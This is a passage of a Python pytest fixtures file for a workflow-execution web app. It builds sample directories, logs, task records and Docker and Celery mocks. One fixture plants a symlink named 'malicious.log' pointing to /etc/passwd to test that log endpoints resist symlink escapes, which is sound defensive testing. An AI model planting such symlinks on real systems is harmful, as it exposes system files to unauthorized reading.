    Creates files in the actual ./user directory that the endpoint expects.
    Uses aggressive pre-cleanup and robust post-cleanup to prevent permission issues.

    Creates:
    - user/{username}/workflow_{id}/algorithm_{id}/ directory structure
    - logs/ directory with sample log files
    - Snakefile
    - plugin/metadata.json
    - results/ directory with sample output files
    - meta.yml (optional metadata file)

    Returns:
        dict: Paths and content for all created files
    """
    import json
    import shutil
    import stat
    from pathlib import Path

    username = sample_manifest_user.username
    workflow_id = sample_workflow.id
    algorithm_id = "2"

    # Pre-cleanup: Try to remove existing test files for this specific workflow
    workflow_path = Path(".") / "user" / username / f"workflow_{workflow_id}"
    if workflow_path.exists():
        def force_remove_readonly(func, path, exc_info):
            """Clear readonly bit and reattempt removal"""
            try:
                os.chmod(path, stat.S_IWRITE | stat.S_IREAD | stat.S_IEXEC)
                func(path)
            except Exception:
                pass  # Ignore errors in error handler

        try:
            shutil.rmtree(workflow_path, onerror=force_remove_readonly)
        except PermissionError:
            # If we can't remove due to permissions, try to clean just our algorithm folder
            algorithm_path = workflow_path / f"algorithm_{algorithm_id}"
            if algorithm_path.exists():
                try:
                    shutil.rmtree(algorithm_path, onerror=force_remove_readonly)
                except Exception:
                    pass  # Give up on pre-cleanup, will use exist_ok=True
        except Exception:
            pass  # Continue even if pre-cleanup fails

    # Create base directory structure in the actual location
    base_path = Path(".") / "user" / username / f"workflow_{workflow_id}" / f"algorithm_{algorithm_id}"
    base_path.mkdir(parents=True, exist_ok=True)

    # Create logs directory and files
    logs_dir = base_path / "logs"
    logs_dir.mkdir(exist_ok=True)

    log_files = {
        "snakemake.log": "Snakemake log content\nRule execution started\nCompleted successfully",
        "analysis.log": "Analysis started at 2025-10-30\nProcessing data...\nAnalysis completed",
        "error.log": ""  # Empty error log for successful run
    }

    for log_name, log_content in log_files.items():
        log_file = logs_dir / log_name
        log_file.write_text(log_content)

    # Create Snakefile
    snakefile_content = """# Generated Snakefile for TestPlugin
rule all:
    input:
        "results/output.txt"

rule analysis:
    output:
        "results/output.txt"
    shell:
        "echo 'Analysis complete' > {output}"
"""
    snakefile = base_path / "Snakefile"
    snakefile.write_text(snakefile_content)

    # Create plugin directory and metadata.json
    plugin_dir = base_path / "plugin"
    plugin_dir.mkdir(exist_ok=True)

    metadata_content = {
        "name": "TestPlugin",
        "version": "1.0.0",
        "author": "test_author",
        "description": "Test plugin for manifest testing",
        "parameters": [
            {
                "name": "param1",
                "type": "string",
                "default": "value1",
                "description": "Test parameter"
            }
        ]
    }
    metadata_file = plugin_dir / "metadata.json"
    metadata_file.write_text(json.dumps(metadata_content, indent=2))

    # Create meta.yml (optional metadata)
    meta_yml_content = """# Workflow metadata
workflow_version: "1.0"
executed_at: "2025-10-30T12:00:00"
parameters:
  param1: value1
"""
    meta_yml = base_path / "meta.yml"
    meta_yml.write_text(meta_yml_content)

    # Create results directory and sample files
    results_dir = base_path / "results"
    results_dir.mkdir(exist_ok=True)

    result_files = {
        "output.txt": "Analysis results\nGene expression data processed\n",
        "summary.json": json.dumps({"genes": 100, "samples": 50}),
        "plot.png": b"\x89PNG\r\n\x1a\n"  # Minimal PNG header for binary file testing
    }

    for result_name, result_content in result_files.items():
        result_file = results_dir / result_name
        if isinstance(result_content, bytes):
            result_file.write_bytes(result_content)
        else:
            result_file.write_text(result_content)

    # Return paths for test verification
    paths_dict = {
        "base_path": base_path,
        "logs_dir": logs_dir,
        "log_files": {name: logs_dir / name for name in log_files.keys()},
        "snakefile": snakefile,
        "plugin_dir": plugin_dir,
        "metadata_json": metadata_file,
        "meta_yml": meta_yml,
        "results_dir": results_dir,
        "result_files": {name: results_dir / name for name in result_files.keys()},
        "username": username,
        "workflow_id": workflow_id,
        "algorithm_id": algorithm_id
    }

    yield paths_dict

    # Post-cleanup: Remove only the workflow directory we created
    try:
        def force_remove_readonly(func, path, exc_info):
            """Clear readonly bit and reattempt removal"""
            try:
                os.chmod(path, stat.S_IWRITE | stat.S_IREAD | stat.S_IEXEC)
                func(path)
            except Exception:
                pass  # Ignore errors in error handler

        workflow_path = Path(".") / "user" / username / f"workflow_{workflow_id}"
        if workflow_path.exists():
            # First pass: Fix all permissions in workflow directory
            for root, dirs, files in os.walk(workflow_path, topdown=False):
                for name in files:
                    try:
                        file_path = os.path.join(root, name)
                        os.chmod(file_path, stat.S_IWRITE | stat.S_IREAD)
                    except Exception:
                        pass
                for name in dirs:
                    try:
                        dir_path = os.path.join(root, name)
                        os.chmod(dir_path, stat.S_IWRITE | stat.S_IREAD | stat.S_IEXEC)
                    except Exception:
                        pass

            # Second pass: Remove workflow directory
            shutil.rmtree(workflow_path, onerror=force_remove_readonly)
    except Exception as e:
        # If cleanup still fails, log warning but don't fail test
        import warnings
        warnings.warn(f"Cleanup failed for workflow {workflow_id}: {e}", RuntimeWarning)


@pytest.fixture
def multiple_user_tasks(db_session: Session, sample_user: models.User, sample_workflow: models.Workflow, sample_plugin: models.Plugin):
    """
    Create multiple tasks with different types and statuses for testing monitoring.

    Args:
        db_session: Database session
        sample_user: User who owns the tasks
        sample_workflow: Workflow associated with tasks
        sample_plugin: Plugin for tasks

    Returns:
        List[models.Task]: List of tasks (compile RUNNING, visualization SUCCESS, plugin_build SUCCESS)
    """
    from datetime import datetime, timedelta
    import uuid

    tasks = []

    # Task 1: Compile task (RUNNING)
    tasks.append(models.Task(
        task_id=f"task-compile-{uuid.uuid4().hex[:8]}",
        user_id=sample_user.id,
        workflow_id=sample_workflow.id,
        algorithm_id="1",
        plugin_name=sample_plugin.name,
        plugin_id=sample_plugin.id,
        task_type="compile",
        status="RUNNING",
        start_time=datetime.now(),
        plugin_image_uri=f"plugin-{sample_plugin.name.lower()}:latest"
    ))

    # Task 2: Visualization task (SUCCESS)
    tasks.append(models.Task(
        task_id=f"task-viz-{uuid.uuid4().hex[:8]}",
        user_id=sample_user.id,
        workflow_id=sample_workflow.id,
        algorithm_id="2",
        plugin_name=sample_plugin.name,
        plugin_id=sample_plugin.id,
        task_type="visualization",
        status="SUCCESS",
        start_time=datetime.now() - timedelta(hours=1),
        end_time=datetime.now(),
        plugin_image_uri=f"plugin-{sample_plugin.name.lower()}:latest"
    ))

    # Task 3: Plugin build task (should be filtered out in monitoring)
    tasks.append(models.Task(
        task_id=f"task-build-{uuid.uuid4().hex[:8]}",
        user_id=sample_user.id,
        workflow_id=sample_workflow.id,
        plugin_name=sample_plugin.name,
        plugin_id=sample_plugin.id,
        task_type="plugin_build",
        status="SUCCESS",
        start_time=datetime.now() - timedelta(hours=2),
        end_time=datetime.now() - timedelta(hours=1),
        plugin_image_uri=f"plugin-{sample_plugin.name.lower()}:latest"
    ))

    for task in tasks:
        db_session.add(task)
    db_session.commit()

    for task in tasks:
        db_session.refresh(task)

    return tasks


@pytest.fixture
def temp_task_logs_directory(sample_user: models.User, sample_workflow: models.Workflow, sample_task: models.Task, monkeypatch):
    """
    Create temporary task logs directory structure for testing log retrieval.

    Uses monkeypatch to inject base directory into endpoint path utilities,
    ensuring tests use this temporary directory instead of production paths.

    Structure:
        /tmp/cellcraft_task_logs_{random}/
            user/{username}/workflow_{id}/algorithm_{algorithm_id}/logs/
                run.log
                rule1.stdout
                rule1.stderr
                rule2.stdout
                rule2.stderr

    Args:
        sample_user: User for directory creation
        sample_workflow: Workflow for directory structure
        sample_task: Task for algorithm_id
        monkeypatch: Pytest monkeypatch fixture

    Yields:
        dict: Directory information
            - base_dir: Root temporary directory (user/)
            - logs_dir: Path to logs directory
            - username: Username
            - workflow_id: Workflow ID
            - algorithm_id: Algorithm ID from task
            - log_files: Dict of {filename: content}
    """
    import tempfile
    import shutil

    temp_base = tempfile.mkdtemp(prefix="cellcraft_task_logs_")
    logs_dir = os.path.join(
        temp_base,
        sample_user.username,
        f"workflow_{sample_workflow.id}",
        f"algorithm_{sample_task.algorithm_id}",
        "logs"
    )
    os.makedirs(logs_dir, exist_ok=True)

    # Monkeypatch environment variable to redirect endpoint to temp directory
    monkeypatch.setenv("CELLCRAFT_USER_BASE_PATH", temp_base)

    # Create sample log files with specific content
    log_files = {
        "run.log": "Task execution log\nStep 1: Loading data\nStep 2: Processing\nStep 3: Complete\n",
        "rule1.stdout": "Rule 1 standard output\nProcessing complete\n",
        "rule1.stderr": "",  # Empty stderr
        "rule2.stdout": "Rule 2 standard output\nAnalysis finished\n",
        "rule2.stderr": "Warning: Deprecated function used\n"
    }

    for filename, content in log_files.items():
        file_path = os.path.join(logs_dir, filename)
        with open(file_path, "w") as f:
            f.write(content)

    yield {
        "base_dir": temp_base,
        "logs_dir": logs_dir,
        "username": sample_user.username,
        "workflow_id": sample_workflow.id,
        "algorithm_id": sample_task.algorithm_id,
        "log_files": log_files
    }

    # Cleanup
    if os.path.exists(temp_base):
        shutil.rmtree(temp_base, ignore_errors=True)


@pytest.fixture
def temp_task_logs_visualization(sample_user: models.User, sample_workflow: models.Workflow, monkeypatch):
    """
    Create temporary task logs directory for visualization tasks.

    Structure:
        /tmp/cellcraft_viz_logs_{random}/
            user/{username}/workflow_{id}/visualization_viz_1/logs/
                run.log
                visualization.stdout
                visualization.stderr

    Args:
        sample_user: User for directory creation
        sample_workflow: Workflow for directory structure
        monkeypatch: Pytest monkeypatch fixture

    Yields:
        dict: Directory information including logs_dir and log_files
    """
    import tempfile
    import shutil

    temp_base = tempfile.mkdtemp(prefix="cellcraft_viz_logs_")
    logs_dir = os.path.join(
        temp_base,
        sample_user.username,
        f"workflow_{sample_workflow.id}",
        "visualization_viz_1",
        "logs"
    )
    os.makedirs(logs_dir, exist_ok=True)

    # Monkeypatch environment variable
    monkeypatch.setenv("CELLCRAFT_USER_BASE_PATH", temp_base)

    # Create visualization log files
    log_files = {
        "run.log": "Visualization task log\nRendering plot\nSaving image\n",
        "visualization.stdout": "Plot generated successfully\n",
        "visualization.stderr": ""
    }

    for filename, content in log_files.items():
        file_path = os.path.join(logs_dir, filename)
        with open(file_path, "w") as f:
            f.write(content)

    yield {
        "base_dir": temp_base,
        "logs_dir": logs_dir,
        "username": sample_user.username,
        "workflow_id": sample_workflow.id,
        "algorithm_id": "viz_1",
        "log_files": log_files
    }

    # Cleanup
    if os.path.exists(temp_base):
        shutil.rmtree(temp_base, ignore_errors=True)


@pytest.fixture
def temp_task_logs_unreadable(temp_task_logs_directory):
    """
    Create unreadable log file for testing error handling.

    Creates a file with permissions set to 000 (no read access).

    Args:
        temp_task_logs_directory: Base logs directory fixture

    Yields:
        str: Path to unreadable file
    """
    unreadable_file = os.path.join(
        temp_task_logs_directory["logs_dir"],
        "unreadable.log"
    )

    with open(unreadable_file, "w") as f:
        f.write("This file should be unreadable\n")

    # Remove all permissions
    os.chmod(unreadable_file, 0o000)

    yield unreadable_file

    # Restore permissions for cleanup
    try:
        os.chmod(unreadable_file, 0o644)
    except:
        pass  # File might not exist if test deleted it


@pytest.fixture
def temp_task_logs_with_symlink(temp_task_logs_directory):
    """
    Create symlink pointing outside user directory for security testing.

    Tests that endpoints do not follow symlinks that escape the user directory.

    Args:
        temp_task_logs_directory: Base logs directory fixture

    Yields:
        dict: Symlink information
            - symlink_path: Path to the symlink
            - target: Target path the symlink points to
    """
    import sys

    # Create symlink pointing to /etc/passwd (or equivalent sensitive file)
    if sys.platform == "win32":
        target = "C:\\Windows\\System32\\drivers\\etc\\hosts"
    else:
        target = "/etc/passwd"

    symlink_path = os.path.join(
        temp_task_logs_directory["logs_dir"],
        "malicious.log"
    )

    try:
        os.symlink(target, symlink_path)
    except OSError:
        # Symlink creation might fail on Windows without admin
        # Create a regular file instead for cross-platform compatibility
        with open(symlink_path, "w") as f:
            f.write("Simulated symlink attack\n")

    yield {
        "symlink_path": symlink_path,
        "target": target,
        "logs_dir": temp_task_logs_directory["logs_dir"]
    }

    # Cleanup
    try:
        if os.path.islink(symlink_path):
            os.unlink(symlink_path)
        elif os.path.exists(symlink_path):
            os.remove(symlink_path)
    except:
        pass


@pytest.fixture
def mock_celery_app():
    """
    Mock Celery app for task revocation tests.

    Returns:
        MagicMock: Mocked Celery application with control.revoke method
    """
    from unittest.mock import MagicMock

    mock_app = MagicMock()
    mock_app.control = MagicMock()
    mock_app.control.revoke = MagicMock()

    return mock_app


@pytest.fixture
def mock_docker_client():
    """
    Mock Docker client for container operations testing.

    Returns:
        MagicMock: Mocked Docker client with container operations
    """
    from unittest.mock import MagicMock

    mock_client = MagicMock()

    # Mock containers.list()
    mock_client.containers.list.return_value = []

    # Mock containers.get()
    def mock_get_container(container_id):
        mock_container = MagicMock()
        mock_container.id = container_id
        mock_container.name = f"container-{container_id[:8]}"
        mock_container.status = "running"
        mock_container.labels = {
            "celery.task_id": "test-task-id",
            "container.type": "plugin-execution"
        }
        # Add methods
        mock_container.kill = MagicMock()
        mock_container.wait = MagicMock(return_value={"StatusCode": 0})
        mock_container.remove = MagicMock()
        return mock_container

    mock_client.containers.get = mock_get_container

    return mock_client


@pytest.fixture
def mock_snakemake_dag():
    """
    Mock Snakemake DAG structure for parsing tests.

    Returns:
        dict: Mock DAG structure with nodes, edges, and execution sequence
    """
    return {
        'nodes': [
            {
                'id': 'rule1',
                'label': 'Rule 1: Data Loading',
                'description': 'Load input data',
                'inputs': ['input.h5ad'],
                'outputs': ['intermediate.csv'],
                'params': {},
                'log_paths': {
                    'stdout': './logs/rule1.stdout',
                    'stderr': './logs/rule1.stderr'
                }
            },
            {
                'id': 'rule2',
                'label': 'Rule 2: Analysis',
                'description': 'Perform GRN analysis',
                'inputs': ['intermediate.csv'],
                'outputs': ['output.csv'],
                'params': {'threshold': 0.05},
                'log_paths': {
                    'stdout': './logs/rule2.stdout',
                    'stderr': './logs/rule2.stderr'
                }
            }
        ],
        'edges': [
            {'from': 'rule1', 'to': 'rule2'}
        ],
        'execution_sequence': ['rule1', 'rule2'],
        'method': 'native'
    }


@pytest.fixture(autouse=True)
def reset_container_manager():
    """
    Reset ContainerManager global state before each test to ensure isolation.

    This fixture is autouse=True, so it runs automatically before each test
    to prevent state leakage between tests.

    Yields:
        None
    """
    yield

    # Reset ContainerManager state after test
    try:
        from app.common.utils.docker_utils import container_manager
        # Clear all mappings
        container_manager._task_containers.clear()
        container_manager._container_tasks.clear()
        container_manager._cleanup_in_progress.clear()
    except ImportError:
        # Container manager not available, skip cleanup
        pass
